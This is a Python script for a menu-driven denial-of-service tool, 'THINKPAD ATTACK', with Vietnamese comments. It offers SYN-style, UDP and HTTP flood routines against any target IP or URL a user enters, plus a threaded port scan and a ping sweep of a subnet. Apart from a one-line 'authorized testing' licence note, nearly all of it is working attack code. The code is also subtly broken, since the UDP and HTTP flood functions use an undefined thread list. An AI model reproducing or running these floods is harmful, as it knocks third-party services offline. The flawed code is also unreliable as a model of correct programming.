#!/usr/bin/env python3
"""
THINKPAD ATTACK v1.0
Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: python thinkpad_attack.py
"""

import sys
import os
import time
import json
import random
import socket
import threading
import subprocess
import platform
from datetime import datetime
from typing import Dict, List, Optional

# ==================== VERSION ====================
VERSION = "1.0.0"
AUTHOR = "F1REW0LF"

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== BANNER ====================
def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ████████╗██╗  ██╗██╗███╗   ██╗██╗  ██╗██████╗  █████╗ ██████╗ 
    ╚══██╔══╝██║  ██║██║████╗  ██║██║  ██║██╔══██╗██╔══██╗██╔══██╗
       ██║   ███████║██║██╔██╗ ██║███████║██████╔╝███████║██████╔╝
       ██║   ██╔══██║██║██║╚██╗██║██╔══██║██╔═══╝ ██╔══██║██╔══██╗
       ██║   ██║  ██║██║██║ ╚████║██║  ██║██║     ██║  ██║██║  ██║
       ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.GOLD}          THINKPAD ATTACK FRAMEWORK v{VERSION}{Colors.WHITE}
{Colors.CYAN}    Professional Attack Tool - Optimized for ThinkPad{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== HARDWARE DETECTION ====================
class HardwareDetector:
    @staticmethod
    def get_cpu_cores():
        try:
            import psutil
            return psutil.cpu_count(logical=True)
        except:
            return os.cpu_count() or 4
    
    @staticmethod
    def get_ram_gb():
        try:
            import psutil
            return psutil.virtual_memory().total / (1024**3)
        except:
            return 8
    
    @staticmethod
    def get_network_speed():
        try:
            import psutil
            stats = psutil.net_if_stats()
            for name, stat in stats.items():
                if 'wlan' in name.lower() or 'eth' in name.lower():
                    return stat.speed
        except:
            pass
        return 1000  # Mbps

# ==================== ATTACK ENGINE ====================
class ThinkPadAttack:
    def __init__(self):
        self.cores = HardwareDetector.get_cpu_cores()
        self.ram = HardwareDetector.get_ram_gb()
        self.network_speed = HardwareDetector.get_network_speed()
        self.running = True
        self.stats = {'packets': 0, 'targets': 0}
        
        # Tối ưu tham số dựa trên phần cứng
        self.threads = min(self.cores * 2, 32)
        self.packet_rate = 1000 if self.ram > 8 else 500
        self.buffer_size = 8192 if self.ram > 16 else 4096
        
        cprint(f"[+] CPU Cores: {self.cores}", Colors.GREEN)
        cprint(f"[+] RAM: {self.ram:.1f} GB", Colors.GREEN)
        cprint(f"[+] Threads: {self.threads}", Colors.GREEN)
        cprint(f"[+] Packet Rate: {self.packet_rate} p/s", Colors.GREEN)
    
    # ==================== ATTACK VECTORS ====================
    
    def syn_flood(self, target_ip, target_port=80, duration=30):
        """SYN Flood Attack - Tối ưu cho ThinkPad"""
        cprint(f"\n[SYN] Attacking {target_ip}:{target_port}", Colors.RED)
        
        def send_syn():
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((target_ip, target_port))
                self.stats['packets'] += 1
            except:
                pass
            sock.close()
        
        start = time.time()
        threads = []
        while time.time() - start < duration:
            for _ in range(self.threads):
                t = threading.Thread(target=send_syn)
                t.daemon = True
                threads.append(t)
                t.start()
            time.sleep(0.01)
        
        cprint(f"[+] Sent {self.stats['packets']} SYN packets", Colors.GREEN)
    
    def udp_flood(self, target_ip, target_port=53, duration=30):
        """UDP Flood Attack"""
        cprint(f"\n[UDP] Flooding {target_ip}:{target_port}", Colors.RED)
        
        def send_udp():
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(1024)
            try:
                sock.sendto(data, (target_ip, target_port))
                self.stats['packets'] += 1
            except:
                pass
            sock.close()
        
        start = time.time()
        while time.time() - start < duration:
            for _ in range(self.threads):
                t = threading.Thread(target=send_udp)
                t.daemon = True
                threads.append(t)
                t.start()
            time.sleep(0.01)
        
        cprint(f"[+] Sent {self.stats['packets']} UDP packets", Colors.GREEN)
    
    def http_flood(self, target_url, duration=30):
        """HTTP Flood Attack"""
        cprint(f"\n[HTTP] Flooding {target_url}", Colors.RED)
        
        def send_http():
            try:
                import requests
                response = requests.get(target_url, timeout=1)
                self.stats['packets'] += 1
            except:
                pass
        
        start = time.time()
        while time.time() - start < duration:
            for _ in range(self.threads):
                t = threading.Thread(target=send_http)
                t.daemon = True
                threads.append(t)
                t.start()
            time.sleep(0.01)
        
        cprint(f"[+] Sent {self.stats['packets']} HTTP requests", Colors.GREEN)
    
    def port_scan(self, target_ip, ports=None):
        """Port Scan - Tối ưu tốc độ"""
        if not ports:
            ports = [21,22,23,25,53,80,135,139,443,445,3389,8080,8443]
        
        cprint(f"\n[SCAN] Scanning {target_ip}", Colors.BLUE)
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((target_ip, port)) == 0:
                    cprint(f"[+] Port {port} open", Colors.GREEN)
                    self.stats['targets'] += 1
                sock.close()
            except:
                pass
        
        threads = []
        for port in ports:
            t = threading.Thread(target=scan_port, args=(port,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        cprint(f"[+] Found {self.stats['targets']} open ports", Colors.GREEN)
    
    def network_scan(self, network="192.168.1.0/24"):
        """Quét mạng - Phát hiện thiết bị"""
        cprint(f"\n[SCAN] Scanning network {network}", Colors.BLUE)
        
        base = network.split('/')[0].rsplit('.', 1)[0]
        hosts = []
        
        def scan_ip(ip):
            try:
                result = subprocess.run(['ping', '-n', '1', '-w', '300', ip], 
                                       capture_output=True)
                if result.returncode == 0:
                    hosts.append(ip)
                    cprint(f"[+] {ip} is alive", Colors.GREEN)
            except:
                pass
        
        threads = []
        for i in range(1, 255):
            ip = f"{base}.{i}"
            t = threading.Thread(target=scan_ip, args=(ip,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join(timeout=0.1)
        
        cprint(f"[+] Found {len(hosts)} active hosts", Colors.GREEN)
        return hosts
    
    def show_stats(self):
        """Hiển thị thống kê"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.WHITE}")
        cprint(" STATISTICS", Colors.PURPLE, bold=True)
        print(f"{'='*60}")
        print(f"Packets Sent: {self.stats['packets']}")
        print(f"Targets Found: {self.stats['targets']}")
        print(f"Threads: {self.threads}")
        print(f"Packet Rate: {self.packet_rate} p/s")
        print(f"{'='*60}")

# ==================== MAIN ====================
def main():
    print_banner()
    
    attack = ThinkPadAttack()
    
    while True:
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}THINKPAD ATTACK - MENU{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] SYN Flood
[2] UDP Flood
[3] HTTP Flood
[4] Port Scan
[5] Network Scan
[6] Show Stats
[7] Exit
""")
        
        choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
        
        if choice == '1':
            target = input("[>] Target IP: ").strip()
            port = int(input("[>] Port (80): ").strip() or "80")
            duration = int(input("[>] Duration (30s): ").strip() or "30")
            attack.syn_flood(target, port, duration)
        
        elif choice == '2':
            target = input("[>] Target IP: ").strip()
            port = int(input("[>] Port (53): ").strip() or "53")
            duration = int(input("[>] Duration (30s): ").strip() or "30")
            attack.udp_flood(target, port, duration)
        
        elif choice == '3':
            url = input("[>] Target URL: ").strip()
            duration = int(input("[>] Duration (30s): ").strip() or "30")
            attack.http_flood(url, duration)
        
        elif choice == '4':
            target = input("[>] Target IP: ").strip()
            attack.port_scan(target)
        
        elif choice == '5':
            network = input("[>] Network (192.168.1.0/24): ").strip() or "192.168.1.0/24"
            attack.network_scan(network)
        
        elif choice == '6':
            attack.show_stats()
        
        elif choice == '7':
            cprint("[*] Exiting...", Colors.GREEN)
            sys.exit(0)
        
        else:
            cprint("[-] Invalid selection", Colors.RED)
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
